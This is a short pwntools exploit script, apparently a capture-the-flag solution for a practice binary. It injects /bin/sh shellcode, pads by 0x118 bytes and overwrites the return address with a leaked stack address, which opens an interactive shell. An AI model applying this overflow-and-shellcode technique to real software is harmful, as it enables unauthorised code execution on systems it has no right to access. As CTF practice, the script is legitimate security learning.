import pwn

pwn.context.arch = 'amd64'
shellcode = pwn.asm(pwn.shellcraft.sh())
print(len(shellcode))

elf = pwn.context.binary = pwn.ELF("./chall_03")

# this took some trial and error
filler = 0x118
payload = shellcode + b"A"*filler

p = pwn.process(elf.path)

# get leak address
p.recvuntil(b":) ")
leak = p.recvuntil(b"\n")
payload += pwn.p64(int(leak, 16))

p.sendline(payload)

p.interactive()
